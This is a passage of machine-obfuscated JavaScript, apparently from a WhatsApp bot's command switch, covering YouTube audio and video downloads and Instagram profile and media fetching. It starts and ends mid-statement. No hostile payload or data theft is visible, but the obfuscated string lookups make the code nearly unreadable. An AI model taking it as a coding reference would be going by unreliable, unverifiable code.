sendButMessage(from,_0x593f96(0x3ed,0xcf,0x82,0x168)+_0x1e23e4(0x8e4,0x3b1,0x54e,0x5ba)+_0x1e23e4(0x686,-0xa7,0x3bc,0x8ad)+'tuk\x20user\x20p'+_0x1e23e4(0x552,0x459,0x6db,0x498)+_0x593f96(0x65e,0x8c3,0x601,0x65f)+_0x593f96(0xaff,0xe0f,0xf5f,0xd96)+_0x593f96(0x5af,0x1d9,0x13c,0x4f1)+'ngan\x20cara\x20'+'ketik\x20'+prefix+_0x1e23e4(0x7b4,0x577,0x998,0xe0b),'Click\x20butt'+'on\x20below',[_0x4f6b2d],_0x18a8bc);if(args['length']===-0xb5a+0xf0b*0x2+-0xda*0x16)return reply(_0x593f96(0xb78,0xaaa,0x950,0x9f0)+_0x1e23e4(0x53b,0x98d,0x962,0x706)+prefix+(_0x593f96(0x4d2,0x979,0xe9,0x48b)+_0x1e23e4(0xdb7,0x8fa,0x9aa,0x9e2)+_0x593f96(0x43f,0x4e,0x281,0x865)+'dicari_'));var srch=args[_0x593f96(0xc2f,0xe07,0xcbc,0xd06)]('');aramas=await yts(srch),server='en68',aramat=aramas[_0x1e23e4(0x78e,0x467,0x4b0,0x583)];var mulaikah=aramat[-0x7d7+-0x2005+0x27dc]['url'];try{ytv4(srch,server)[_0x1e23e4(0xa6f,0x405,0x667,0x45d)](_0x4851fc=>{function _0x1a91b8(_0xf24cc9,_0x5b5c53,_0x18e540,_0x48de9e){return _0x593f96(_0xf24cc9- -0xfa,_0x18e540,_0x18e540-0x4c,_0x48de9e-0x10c);}const _0x485e6f={'uyyhl':function(_0x49fb93,_0x404086){return _0x49fb93(_0x404086);},'YlORl':function(_0x1b27d0,_0xf698e3){return _0x1b27d0>=_0xf698e3;},'uyYFz':function(_0x4bdd33,_0x526250){return _0x4bdd33(_0x526250);},'wUTiY':function(_0x29412f,_0x17c627,_0x4eb6c7,_0x24af40){return _0x29412f(_0x17c627,_0x4eb6c7,_0x24af40);},'UlgTm':function(_0x4d713a,_0x497117,_0x3007d7,_0x3f82d3){return _0x4d713a(_0x497117,_0x3007d7,_0x3f82d3);}};function _0x3f5eb6(_0x5d8d85,_0x299022,_0xa86471,_0x10ab18){return _0x1e23e4(_0x5d8d85-0x2,_0x299022-0x10,_0x10ab18- -0x18f,_0xa86471);}const {dl_link:_0x164524,thumb:_0x3a730a,title:_0x4008a6,filesizeF:_0x372608,filesize:_0x52f9cd}=_0x4851fc;axios[_0x3f5eb6(-0x276,-0x186,0x327,0x212)](_0x3f5eb6(0x4b1,0x501,0x61e,0x19a)+_0x3f5eb6(0x617,0x9f4,0x63c,0x54a)+'api-create'+_0x1a91b8(0xa4a,0xeb9,0x9d5,0xf24)+_0x164524)['then'](async _0x2bb727=>{function _0xcde3a6(_0x23743d,_0x1dc741,_0x466bb6,_0x3e8163){return _0x1a91b8(_0x3e8163-0x280,_0x1dc741-0x11b,_0x23743d,_0x3e8163-0xcd);}const _0x4afcb0={'pztlA':function(_0x489bc5,_0x4925d6){return _0x485e6f['uyyhl'](_0x489bc5,_0x4925d6);},'gIzNV':_0x13d8d4(0x787,0x2ee,0xaa1,0x3c8)};function _0x13d8d4(_0x196c04,_0x17fb43,_0x5d8a22,_0x5bfa4d){return _0x1a91b8(_0x196c04-0x2f9,_0x17fb43-0x1c1,_0x5bfa4d,_0x5bfa4d-0x76);}if(_0x485e6f[_0xcde3a6(0x10c6,0xde5,0x10fe,0xe3c)](_0x485e6f['uyYFz'](Number,_0x52f9cd),-0x56e*0x5f+0x49*0x31+0x37c79))return _0x485e6f[_0x13d8d4(0xcdd,0x11ea,0x106d,0x11f7)](sendMediaURL,from,_0x3a730a,_0x13d8d4(0x8ae,0xd7b,0xb48,0x811)+_0x13d8d4(0x906,0x457,0xa08,0x946)+enter+enter+('🐣\x20*Title\x20:'+'*\x20')+_0x4008a6+enter+(_0x13d8d4(0x950,0x55c,0x976,0xe26)+_0x13d8d4(0x8c8,0x8ee,0x996,0x5d6)+'ps')+enter+(_0x13d8d4(0xab4,0x8ab,0xb55,0x8ff)+_0x13d8d4(0x7f5,0x85b,0x98a,0xc37))+enter+(_0x13d8d4(0x980,0x52a,0x8ae,0xa20)+_0x13d8d4(0xcbe,0x813,0x7d9,0xbcf))+_0x372608+enter+(_0x13d8d4(0xd00,0xa22,0xde8,0x9c0)+'\x20')+_0x2bb727['data']+enter+enter+(_0xcde3a6(0xaea,0x27c,0x732,0x767)+'asi\x20lebih\x20'+_0x13d8d4(0xdaa,0x9d0,0xc48,0x1196)+_0xcde3a6(0xbc2,0x1014,0x992,0xc3e)+_0xcde3a6(0x9f4,0x1215,0xba9,0xd0f)+_0x13d8d4(0xda9,0xcf4,0xae0,0x108d)));_0x485e6f[_0x13d8d4(0x6c6,0xa4b,0x1d0,0x5d7)](sendMediaURL,from,_0x164524,'')[_0x13d8d4(0xe8b,0xb43,0x12cb,0xba0)](_0x47023f=>{function _0x3ca631(_0x3150ca,_0x2ad479,_0x2ee178,_0x548a72){return _0x13d8d4(_0x2ee178- -0x61c,_0x2ad479-0x12b,_0x2ee178-0x73,_0x548a72);}function _0x3b069b(_0x2d158a,_0x14a22c,_0x26d136,_0x1da4ad){return _0x13d8d4(_0x26d136- -0x4e0,_0x14a22c-0x1b4,_0x26d136-0x15d,_0x2d158a);}_0x4afcb0[_0x3ca631(-0x448,0x1da,0x69,0x4dc)](reply,_0x4afcb0[_0x3b069b(0x3e0,0x94d,0x501,0x8d9)]);});});});}catch(_0x206b65){reply(mess[_0x1e23e4(0x225,0x57a,0x577,0x6c8)][_0x1e23e4(0xd1b,0x838,0xae9,0x9b3)]);}}break;case _0x1e23e4(0x34f,-0xd4,0x3e4,0x776):{if(args[_0x1e23e4(0xc61,0x5b7,0x90a,0x80f)]===0x33*0xad+-0x4*0x757+-0x51b)return reply('Kirim\x20peri'+_0x593f96(0xb40,0xf55,0xb69,0x8b8)+prefix+(_0x593f96(0x4d2,0x97c,0x624,0x214)+_0x1e23e4(0x774,0x4d8,0x9aa,0xe3f)+_0x1e23e4(-0x1d9,-0x1d7,0x261,0x61f)+_0x593f96(0x43b,0x182,0x504,0xf4)));var srch=args[_0x593f96(0xc2f,0xf90,0x9fb,0xbea)]('');aramas=await yts(srch),server=_0x593f96(0x911,0x72b,0x9cb,0xe29),aramat=aramas[_0x593f96(0x68e,0x9f6,0x7b3,0x8fb)];var mulaikah=aramat[-0x5*-0x6c5+0x2497+-0x4670]['url'];try{ytv2(srch,server)[_0x1e23e4(0x707,0x1ed,0x667,0xb47)](_0x2cf6ae=>{const _0x386d5b={'IcWvq':_0x1b7681(-0x2ba,0x143,0x164,0x371),'tFxIn':function(_0xacb158,_0x4b9431){return _0xacb158>=_0x4b9431;},'PnpcE':function(_0x516973,_0x924f2c,_0x4ddaae,_0xeac716){return _0x516973(_0x924f2c,_0x4ddaae,_0xeac716);},'CdxJy':function(_0x1ec773,_0x506004){return _0x1ec773(_0x506004);},'rksmn':'https://yo'+_0x2b7414(0x925,0x51f,0x67a,0x949)+_0x2b7414(0xa9b,0x75a,0xc53,0xa50),'rYJYs':_0x1b7681(0x61a,0x6d1,0x2e2,0x843)},{dl_link:_0x5814aa,thumb:_0x335a87,title:_0x2c1422,filesizeF:_0x5dd2ed,filesize:_0x3f895a}=_0x2cf6ae;function _0x2b7414(_0x9c9f98,_0x4ba585,_0x13daa7,_0xf06895){return _0x1e23e4(_0x9c9f98-0x166,_0x4ba585-0x174,_0x4ba585- -0x36c,_0xf06895);}function _0x1b7681(_0x330cec,_0x9f6b85,_0x16d06e,_0x437bb0){return _0x1e23e4(_0x330cec-0x3d,_0x9f6b85-0x11a,_0x9f6b85- -0x2f5,_0x437bb0);}axios[_0x1b7681(-0x82,0xac,-0x1f7,0x4c5)](_0x2b7414(-0x35b,-0x43,0x2ac,0x39f)+_0x2b7414(0xec,0x36d,0x4b2,0x8a)+_0x2b7414(0x3f2,0x3e1,-0x6b,0x719)+'.php?url='+_0x5814aa)['then'](async _0x456bd1=>{function _0x573abb(_0x48585e,_0x58db43,_0x2b89f0,_0x753c03){return _0x2b7414(_0x48585e-0x18b,_0x58db43-0x179,_0x2b89f0-0xd7,_0x48585e);}function _0x5b7cc7(_0x5f40fd,_0x35e8ec,_0x5922c8,_0x16c86c){return _0x2b7414(_0x5f40fd-0xfc,_0x35e8ec-0x554,_0x5922c8-0x137,_0x5922c8);}if(_0x386d5b[_0x573abb(0x6a1,0x619,0x50f,0x57e)]!==_0x573abb(0x8c1,0x8ab,0xcb1,0x649)){if(_0x386d5b[_0x573abb(0x9d9,0x86e,0x3c3,0x487)](Number(_0x3f895a),-0x1bab2+0x177b6+0x2*0xe4ce))return _0x386d5b[_0x573abb(0x158,0x563,0x5db,0x780)](sendMediaURL,from,_0x335a87,'*📽️\x20YOUTUBE'+'-PLAY\x20MP4*'+'*'+enter+enter+('🐣\x20*Title*\x20'+':\x20')+_0x2c1422+enter+(_0x573abb(0x395,0x4e4,0x60f,0x6de)+_0x573abb(0x6f5,0x225,0xde,-0x154))+enter+(_0x573abb(0x271,0x3b0,0x87f,0x502)+'e*\x20:\x20')+_0x5dd2ed+enter+('🐺\x20*Link*\x20:'+'\x20')+_0x456bd1[_0x573abb(0x69e,0x557,0x649,0x882)]+enter+enter+(_0x5b7cc7(0x9bf,0x5eb,0x515,0xa36)+_0x5b7cc7(0x76f,0x33d,0x35,0x7a0)+_0x573abb(0x618,0x7da,0xbac,0x73e)+_0x573abb(0x35d,0x6e7,0x28b,0x5a0)+_0x5b7cc7(0x106b,0xb93,0xd72,0xe3c)+_0x5b7cc7(0xf73,0xbb4,0x6f0,0x852)));let _0x49ab16=await _0x386d5b['CdxJy'](getBuffer,_0x5814aa);const _0x222a40={};_0x222a40[_0x573abb(-0x43e,-0xe6,-0x34,-0x461)]=_0x386d5b[_0x5b7cc7(0x419,0x5d4,0x974,0x739)],_0x222a40[_0x573abb(-0xd2,0x37c,0x83e,0x362)]=0x2,_0x222a40[_0x5b7cc7(0xb9e,0x962,0x455,0x817)]=_0x573abb(0x4a2,0x88,-0x1ec,0x30)+'4',_0x222a40[_0x573abb(-0x119,-0x115,-0x33d,0x3cf)]='',_0x222a40[_0x5b7cc7(0x868,0xbbc,0xbc8,0x798)+'rl']='',_0x222a40['thumbnail']=pp_userz;const _0x5c4634={};_0x5c4634['forwarding'+_0x573abb(0x80f,0x415,0x2bc,0x2b9)]=0x3b9aca00,_0x5c4634[_0x5b7cc7(0xf2e,0xc97,0xd60,0xb58)+'d']=!![],_0x5c4634[_0x573abb(0x2dc,-0xb1,-0x45e,-0x1bc)+'ral']=!![],_0x5c4634[_0x5b7cc7(0x51a,0x5b8,0x288,0x782)+_0x573abb(0x5c,-0xfd,-0x2b1,-0x6a)]=_0x222a40;const _0x177d52={};_0x177d52[_0x573abb(0x625,0x6d3,0x2d4,0xa3b)+'o']=_0x5c4634,_0x177d52[_0x5b7cc7(0xafc,0xaa3,0xa44,0x697)]=_0x386d5b[_0x5b7cc7(0x898,0x909,0xb8a,0xc48)],_0x177d52[_0x573abb(0x4c5,0x19d,0x541,0x1cc)]=_0x2c1422+'.mp4',_0x177d52[_0x5b7cc7(0x579,0x99b,0x8e7,0x57e)]=fgclink2,_0x177d52[_0x5b7cc7(0x3b9,0x454,0x803,0x159)]=pp_userz,alpha['sendMessag'+'e'](from,_0x49ab16,MessageType[_0x5b7cc7(0xafc,0x65d,0x235,0x412)],_0x177d52);}else _0x4e8aa6(_0x70b92[_0x5b7cc7(0x80a,0x75f,0x880,0xb4c)]['api']);});});}catch(_0x2009ea){reply(mess[_0x593f96(0x755,0xc13,0x754,0x763)]['api']);}}await limitAdd(sender,limit);break;case'ytmp3aja':try{reply(lang[_0x1e23e4(-0x334,-0x2da,0x143,0x5fe)]());let ksjz=q,yut=await yts(ksjz);yta(ksjz)[_0x1e23e4(0x961,0x3f8,0x667,0xb2b)](_0xa64bc0=>{function _0x36a387(_0x1811b5,_0x1f0cc4,_0x128a5a,_0xe046c1){return _0x593f96(_0x1f0cc4- -0x584,_0xe046c1,_0x128a5a-0xe3,_0xe046c1-0x89);}const _0x5f14c2={'XzLtq':function(_0x3c1ce0,_0x109acc){return _0x3c1ce0(_0x109acc);},'YSEDJ':_0xf95f2a(-0xb,0xec,-0x39b,0x83),'qsOKq':function(_0x574bb6,_0x40b8b8){return _0x574bb6>=_0x40b8b8;},'WmqJc':function(_0x2514cb,_0x1dfe5d,_0xfc811,_0x3793b2){return _0x2514cb(_0x1dfe5d,_0xfc811,_0x3793b2);}};function _0xf95f2a(_0x5257be,_0x58e469,_0x5c5f2f,_0x4a44e9){return _0x1e23e4(_0x5257be-0x185,_0x58e469-0x12a,_0x58e469- -0x2be,_0x5257be);}const {dl_link:_0x17337e,thumb:_0x26d2fb,title:_0x560c62,filesizeF:_0x269cf1,filesize:_0x4181d0}=_0xa64bc0;axios['get'](_0x36a387(0x328,-0x7d,0x2bd,-0x492)+'nyurl.com/'+_0xf95f2a(0x328,0x48f,0x80b,0x56e)+'.php?url='+_0x17337e)['then'](async _0x58add8=>{if(_0x5f14c2[_0x935411(-0x5,0x776,0x2c9,-0x1c1)](Number(_0x4181d0),-0xacfc+-0x1*0xd8b3+0x1fadf))return _0x5f14c2[_0x935411(-0x224,-0x159,0x2e6,0x166)](sendMediaURL,from,_0x26d2fb,_0x428309(-0x26c,0x1e,0x20f,0x667)+_0x935411(0x595,0xb5,0x2dc,-0xa)+_0x428309(0x70,-0x3c,0x295,-0x77)+_0x560c62+(_0x428309(0x9,-0x50,0x409,0x8e3)+_0x428309(0x986,0x235,0x4db,0xd7))+yut[_0x428309(-0x207,-0x4e,0x23b,0x2b)][-0x1f06+0xc56*0x2+0x65a][_0x428309(0x982,0x453,0x5bb,0x92f)]+(_0x428309(-0x16f,0x6fe,0x296,0x77c)+':\x20')+yut['videos'][-0x878+0xefb*-0x1+-0x105*-0x17]['ago']+(_0x428309(-0x1b4,0x105,0x242,-0x232)+'\x20')+_0x269cf1+_0x935411(0x371,-0x81,0x1f3,0x41f)+yut[_0x935411(-0x36f,0x13b,0x142,0x4e0)][0x1193+-0x19f2+0x85f][_0x935411(0x3a5,0xafe,0x72e,0xabb)]+('\x20\x0a🐣\x20Durati'+_0x428309(-0x11f,0x1ee,0x2d6,0x282))+yut['videos'][-0x253b+-0xe01+0x333c][_0x935411(0x5f5,0xaf7,0x6ca,0x5be)]+_0x428309(0x95,-0xd5,0x36c,0x7ec)+yut[_0x428309(0x59a,0x6a8,0x23b,0x4b4)][0x2e*0xa5+-0x8f6+-0x14b0][_0x428309(0x690,0x6a1,0x1be,-0x8)]+(_0x935411(0x389,0xb30,0x76b,0xade)+'\x20duration\x20'+'of\x20more\x20th'+_0x935411(0x9b,0x153,0x475,0x501)+_0x935411(0x675,0x471,0x7a9,0x906)+_0x935411(-0xea,0x108,0x1c4,0x13e)+_0x428309(0x4cf,-0xc4,0x3b3,0x7f0)+_0x428309(0xca3,0xbf5,0x857,0xa1e)));function _0x935411(_0x4cde5d,_0x12e16d,_0x2278c6,_0x4183a3){return _0x36a387(_0x4cde5d-0xcd,_0x2278c6-0x318,_0x2278c6-0xda,_0x12e16d);}function _0x428309(_0x5a253e,_0x600ef5,_0x5ec7ec,_0x31dfa6){return _0x36a387(_0x5a253e-0x85,_0x5ec7ec-0x411,_0x5ec7ec-0x25,_0x5a253e);}_0x5f14c2[_0x428309(0x383,0x809,0x3df,0x54d)](sendMediaURL,from,_0x17337e,'')['catch'](_0x24d58d=>{function _0x318895(_0xf79d1,_0x20c2e6,_0x1e82db,_0x5363ff){return _0x935411(_0xf79d1-0x4f,_0x5363ff,_0xf79d1- -0x13b,_0x5363ff-0x16e);}_0x5f14c2['XzLtq'](reply,_0x5f14c2[_0x318895(0x97,0x248,-0x259,-0x3df)]);});});})[_0x1e23e4(0x888,0xc01,0xaae,0x9f6)](_0x52e965=>reply(''+_0x52e965));}catch(_0xcbaa3f){console[_0x593f96(0x76c,0xbd8,0x877,0x6e4)](color(_0x1e23e4(0x63f,0x277,0x19c,0x1c3),_0x1e23e4(-0x27d,0x270,0x130,-0xc9)),_0xcbaa3f);}await limitAdd(sender,limit);break;case _0x593f96(0x9ff,0x8d2,0xba2,0x545):try{reply(lang[_0x1e23e4(0x2ab,-0x3a0,0x143,0x76)]());let ksjjz=q,yut=await yts(ksjjz);yta(ksjjz)['then'](_0x39c99e=>{const _0x5af858={'WgkrC':'zElaY','fAsrk':_0x945df(0x56,0x2d9,-0xfc,-0x53),'YQtWO':function(_0x571250,_0x3f0126){return _0x571250>=_0x3f0126;},'Chipk':function(_0x318dd9,_0x2d9f24,_0x175c29,_0x41ed18){return _0x318dd9(_0x2d9f24,_0x175c29,_0x41ed18);},'CYbxA':function(_0x1fda86,_0x3aadb9){return _0x1fda86(_0x3aadb9);},'GipFt':_0x945df(0x3ba,0x16d,0x973,0x5d4)+_0x945df(0x73f,0x45e,0x1bd,0x4a1)+_0x945df(0x9d2,0x9f5,0x9d9,0x6dc)};function _0x945df(_0x565a6a,_0x533b58,_0x7e8ab0,_0x3ec14b){return _0x593f96(_0x3ec14b- -0x5c8,_0x7e8ab0,_0x7e8ab0-0x98,_0x3ec14b-0x9c);}function _0xf1d310(_0x40eb07,_0x1d411a,_0x11f36b,_0x1e50a6){return _0x593f96(_0x11f36b- -0x32a,_0x1d411a,_0x11f36b-0x1ea,_0x1e50a6-0xf1);}const {dl_link:_0xd2e38,thumb:_0x431ab3,title:_0x20ee3e,filesizeF:_0x3a1a28,filesize:_0x4d27c1}=_0x39c99e;axios[_0xf1d310(-0x50,0x3b,0x255,-0x84)](_0xf1d310(-0x2b7,0x1c8,0x1dd,-0x1d3)+_0xf1d310(0x5d3,0x52b,0x58d,0x6a9)+'api-create'+_0x945df(0x4c4,0x14a,0xa6a,0x57c)+_0xd2e38)[_0xf1d310(0x737,0x7f3,0x51b,0x1e6)](async _0x4aed5a=>{function _0x1ee0c1(_0x30a644,_0x18d5f2,_0x159b9d,_0x21fd8f){return _0xf1d310(_0x30a644-0xb0,_0x21fd8f,_0x30a644-0x159,_0x21fd8f-0x128);}function _0x32594c(_0x231c7c,_0x43d1dd,_0x421448,_0x470fd8){return _0xf1d310(_0x231c7c-0x10e,_0x470fd8,_0x231c7c- -0x10d,_0x470fd8-0x100);}if(_0x5af858[_0x1ee0c1(0x99e,0xe4f,0x9a1,0xa58)]!==_0x5af858[_0x32594c(0x2a5,-0x229,0x44a,0x4b3)]){if(_0x5af858[_0x32594c(0x64a,0x975,0x608,0x2d6)](Number(_0x4d27c1),-0xd513+-0x1797*0x4+0x173*0x125))return _0x5af858['Chipk'](sendMediaURL,from,_0x431ab3,_0x1ee0c1(0x1b1,0x496,0x4f4,-0x1b8)+_0x1ee0c1(0x377,0x6b5,0x1b5,0x2dd)+'💦\x20Title\x20:\x20'+_0x20ee3e+(_0x32594c(0x145,0xc8,0x2d7,0x1ec)+_0x32594c(0x217,0x23a,0x44,-0x16e))+yut['videos'][-0x1*-0x91d+-0x36d+-0x5b0]['videoId']+(_0x32594c(-0x2e,0x163,0x4b7,0x38c)+':\x20')+yut[_0x1ee0c1(0x1dd,0xf7,-0x134,0x34d)][-0x3*0xaf6+0x3fb*-0x1+-0x24dd*-0x1][_0x32594c(0x14a,-0x207,0x4d0,0x2e2)]+(_0x32594c(-0x82,0x3ab,-0x3eb,0x24)+'\x20')+_0x3a1a28+_0x32594c(0x28,0x236,0x182,0x11d)+yut[_0x1ee0c1(0x1dd,0x2d,0x4cb,0x2f)][-0x2*-0xe39+-0x113b+-0xb37]['views']+(_0x1ee0c1(0x39b,0x607,0x798,0x589)+'on\x20:\x20')+yut[_0x1ee0c1(0x1dd,0xf7,0xa4,0x171)][-0x8*-0x14e+-0x1a74+0x1004][_0x32594c(0x4ff,0x39f,0x694,0x6c6)]+'\x0a🌀\x20Url\x20:\x20'+yut[_0x1ee0c1(0x1dd,-0x2e3,-0x20a,0x51b)][0x6*0x207+-0x1*0x18a1+0xc77][_0x32594c(-0x106,-0x12f,0x2f8,0x28)]+(_0x32594c(0x5a0,0x314,0x8c7,0x939)+_0x32594c(-0xa2,-0x57d,-0x5b9,0x381)+_0x1ee0c1(0x239,-0x24c,0x17,0x4a2)+_0x1ee0c1(0x510,0x378,0x85a,0x15c)+_0x32594c(0x5de,0x3b7,0x342,0xae5)+_0x32594c(-0x7,0x23b,-0x21a,-0x1c6)+_0x32594c(0xef,0x4d8,-0x115,0x25b)+_0x1ee0c1(0x7f9,0x915,0x790,0xae9)));let _0x2625e3=await _0x5af858[_0x1ee0c1(0x2a9,0x363,0x6eb,-0xb5)](getBuffer,_0xd2e38);const _0x3551e5={};_0x3551e5['mediaUrl']=_0x5af858[_0x1ee0c1(0x882,0x90f,0x7f2,0xa18)],_0x3551e5['mediaType']=0x2,_0x3551e5[_0x32594c(0x521,0x378,0x357,0x33f)]=_0x32594c(0x22,-0xde,0x145,-0x122)+'3',_0x3551e5[_0x32594c(-0x17b,0x349,-0x27d,0x399)]='',_0x3551e5['thumbnailU'+'rl']='',_0x3551e5['thumbnail']=pp_userz;const _0xfdea93={};_0xfdea93[_0x1ee0c1(0x83d,0x988,0xa5e,0x8a9)+_0x1ee0c1(0x615,0x308,0x706,0x7fe)]=0x3b9aca00,_0xfdea93[_0x1ee0c1(0xabc,0x5c6,0xd83,0x884)+'d']=!![],_0xfdea93[_0x1ee0c1(0x14f,-0x332,0x5f9,0x546)+_0x32594c(-0x75,0x22,-0x438,-0x184)]=!![],_0xfdea93[_0x32594c(0x177,0x1a0,0x5ae,0x21d)+_0x1ee0c1(0x103,0x358,0x3ed,0x53)]=_0x3551e5;const _0x50cdce={};_0x50cdce['contextInf'+'o']=_0xfdea93,_0x50cdce['mimetype']=_0x1ee0c1(0x7b2,0x31c,0x732,0x2c1),_0x50cdce['filename']=_0x20ee3e+_0x32594c(0x286,0x21d,0x469,0x644),_0x50cdce['quoted']=fgclink2,_0x50cdce[_0x32594c(0x13,0xbe,0x3d8,-0x199)]=pp_userz,alpha['sendMessag'+'e'](from,_0x2625e3,MessageType[_0x1ee0c1(0x482,0x10b,0xf1,0x455)],_0x50cdce);}else{if(_0x2666fc[_0x1ee0c1(0x8a9,0x4b9,0x624,0x919)]==0x13*-0xa4+-0x1*-0xe0a7+-0x9*-0x139){const _0x2f0b62={};_0x2f0b62[_0x1ee0c1(0xdc,0x207,-0x1d8,-0x285)+'id']=[_0x52edec],_0x2f0b62['forwarding'+_0x32594c(0x3af,0x182,0x293,0x195)]=0x3e7,_0x2f0b62['isForwarde'+'d']=!![],_0x284153[_0x32594c(0x42c,0x789,-0x1d,0x78c)+'e'](_0x11feef,_0x2bc29a,_0xd7ffb2,{'thumbnail':_0x3efc99[_0x32594c(0x328,0x538,0x4ca,0x12a)+'nc'](_0x1ee0c1(0xac3,0xe6c,0xc1c,0xb66)+_0x332202),'quoted':_0x40de04,'caption':_0x49a085(_0x438685,_0x2c4125,_0x15e7ad,_0x26ebe4,_0x3a7727),'contextInfo':_0x2f0b62,'sendEphemeral':!![]});}}});})[_0x1e23e4(0xa06,0x6e8,0xaae,0x7cc)](_0x46f7ae=>reply(''+_0x46f7ae));}catch(_0x3b710c){console[_0x593f96(0x76c,0x6ae,0xa3b,0x56f)](color(_0x593f96(0x37a,0x56d,0xaf,0x7fb),'red'),_0x3b710c);}await limitAdd(sender,limit);break;case _0x593f96(0xcb5,0xb0b,0x950,0x108d):case _0x1e23e4(0x525,0x5cc,0x8ea,0xc26):case _0x593f96(0xa3b,0xb02,0x88b,0x588)+_0x593f96(0x3d6,0x5ea,0x84,-0xb6):if(!q)return reply(_0x593f96(0x825,0x82f,0xc9b,0x732)+'a?');pape=q,hx[_0x1e23e4(0x5dd,0x7d1,0xad7,0xdbd)](pape)[_0x1e23e4(0x163,0x776,0x667,0x53a)](async _0xaca554=>{const _0x5227ef={'PQztz':function(_0x121cdd,_0x21cec7){return _0x121cdd(_0x21cec7);},'vZLUv':_0x3fb4ea(0x590,0xa08,0x8cb,0x271)+_0x4b5c98(0x327,0x6eb,0x59c,0x99d)+_0x4b5c98(0x3ec,0x58f,0x19c,0x2ed)+_0x4b5c98(0xe69,0xd65,0xc34,0x965)+'gi','Lwsuc':_0x4b5c98(0x9bd,0x911,0xb95,0xca1),'gNDre':function(_0x3ee086,_0x5555f2){return _0x3ee086===_0x5555f2;},'QGyIl':_0x4b5c98(0x625,0x690,0x736,0x5a7),'qzSbF':_0x4b5c98(0x747,0x6bd,0x304,0x612)};let _0x21316d=await _0x5227ef[_0x4b5c98(0xcea,0x9e0,0x9c9,0x4f2)](getBuffer,_0xaca554[_0x4b5c98(0x81e,0xcb1,0x85d,0xa2e)][_0x3fb4ea(0x585,0x91e,0x60c,0x514)+_0x4b5c98(0x10b7,0xbc4,0xd45,0x984)]);function _0x3fb4ea(_0x3618e0,_0x2416f6,_0x241041,_0x2ce29e){return _0x1e23e4(_0x3618e0-0xcd,_0x2416f6-0x149,_0x3618e0-0xb,_0x2ce29e);}await alpha[_0x4b5c98(0xa5a,0xa3a,0xbbb,0x91e)+'e'](from,_0x21316d,image,{'thumbnail':_0x21316d,'quoted':mek,'caption':'「\x20*INSTAGR'+_0x4b5c98(0x9ec,0x8f3,0x8b5,0x58f)+'」'+enter+enter+_0x3fb4ea(0x3b9,0x29d,0x36c,0x201)+_0xaca554[_0x3fb4ea(0x907,0x9fb,0x5c4,0xc3b)]['id']+enter+(_0x3fb4ea(0x1ad,0x15c,0x6f,0x6a2)+_0x4b5c98(-0x9,0x4ba,0x3f0,0x293))+_0xaca554[_0x4b5c98(0x1091,0xcb1,0x1197,0x9bd)][_0x4b5c98(0x6a4,0xae3,0x6b3,0xe82)]+enter+(_0x4b5c98(0x652,0x5c6,0x56d,0x691)+_0x3fb4ea(0x110,0x1c3,0x2d7,-0x4f))+_0xaca554[_0x4b5c98(0xed9,0xcb1,0xb00,0xb38)][_0x4b5c98(0xe60,0xbe6,0xca4,0x934)]+enter+(_0x3fb4ea(0x331,0x82d,0x2c9,0x7b7)+_0x4b5c98(0x74d,0x48a,0x858,0x59e))+_0xaca554[_0x4b5c98(0xb2a,0xcb1,0x7a9,0x9c3)]['followers']+enter+(_0x3fb4ea(0x1c3,0x15a,0x1b7,0x1f6)+'ng\x20:*\x20')+_0xaca554[_0x3fb4ea(0x907,0xb48,0xa77,0x661)][_0x4b5c98(0xdf8,0xead,0x130d,0xeee)]+enter+(_0x3fb4ea(0xa84,0xa9e,0xbe2,0x957)+_0x4b5c98(0x8ee,0xcaf,0xc55,0xba1)+'nstagram.c'+_0x4b5c98(0x7b0,0x623,0x84e,0x3e3))+_0xaca554['user']['username']+enter+(_0x4b5c98(0x80a,0x76a,0xb6b,0xa40)+'*\x20')+_0xaca554['medias']['length']+_0x3fb4ea(0x950,0xce7,0xd21,0xd50)+enter+enter+(_0x4b5c98(0x8ab,0xcd7,0xa19,0xef3)+_0x3fb4ea(0x35d,0x71d,0x133,0x67b)+_0x3fb4ea(0x124,-0x335,0x2ed,-0x379)+'an\x20dikirim'+'_')});function _0x4b5c98(_0x5618f7,_0x5bdc97,_0x2f8b86,_0x2cd310){return _0x1e23e4(_0x5618f7-0x58,_0x5bdc97-0xd3,_0x5bdc97-0x3b5,_0x2cd310);}for(let _0x338c87 of _0xaca554[_0x4b5c98(0xb21,0x619,0x9dc,0xa43)]){if(_0x338c87[_0x4b5c98(0x33,0x508,0xa01,0x28)][_0x3fb4ea(0x76f,0x2bc,0x26c,0x2d5)](_0x5227ef[_0x3fb4ea(0x64e,0x61d,0x7fe,0x149)])){let _0x3dae9d=await _0x5227ef['PQztz'](getBuffer,_0x338c87['url']);alpha['sendMessag'+'e'](from,_0x3dae9d,video,{'thumbnail':Buffer[_0x3fb4ea(0x943,0x483,0x789,0x62b)](-0x2*-0x9c7+-0x1571*-0x1+-0x28ff),'quoted':mek,'caption':_0x3fb4ea(0x9aa,0x80d,0x8c9,0xbd1)+'•\x20'+_0x338c87[_0x3fb4ea(0x9ab,0xb0e,0xac9,0x56f)]});}else{if(_0x5227ef['gNDre'](_0x5227ef[_0x4b5c98(0x829,0xd1c,0xf0c,0x9c9)],_0x5227ef[_0x4b5c98(0xea5,0xa49,0xc69,0xd0b)]))_0x5227ef[_0x4b5c98(0xcbb,0x9e0,0x61a,0x618)](_0x2b7fcc,_0x5227ef[_0x4b5c98(0xfc8,0xb6e,0x1031,0xe40)]);else{let _0x57d61e=await _0x5227ef['PQztz'](getBuffer,_0x338c87[_0x3fb4ea(0x15e,0x21d,0x209,0x12f)]);alpha['sendMessag'+'e'](from,_0x57d61e,image,{'thumbnail':Buffer[_0x4b5c98(0x10a6,0xced,0xa62,0x11f9)](-0xb5a+0x7c8+0x392*0x1),'quoted':mek,'caption':'Instagram\x20'+'•\x20'+_0x338c87['type']});}}}})[_0x1e23e4(0xb76,0xe8b,0xaae,0xabe)](_0x23a4c6=>reply(_0x593f96(0x763,0xb63,0x524,0xa62)+_0x593f96(0xb95,0xd33,0xc59,0x952)+_0x1e23e4(0xc3f,0x705,0xaac,0xd98)+_0x593f96(0x8f3,0xd19,0xaec,0x3eb)+_0x593f96(0x775,0x9b1,0x618,0x59c)+'ma'));break;case'ig':case _0x593f96(0x83a,0x386,0x5ea,0xad6):case _0x593f96(0x9dc,0x6b6,0x641,0x957):case _0x593f96(0x94f,0xc8b,0xe52,0xb4d):case'instafoto':case _0x1e23e4(0xa2e,0x7e4,0x5b8,0x373):case _0x593f96(0x3c7,-0x13b,0xb4,-0x14c):case _0x1e23e4(0x9e,0x710,0x501,0x148):case _0x593f96(0x6ef,0x90f,0x752,0x300):case'igreels':case 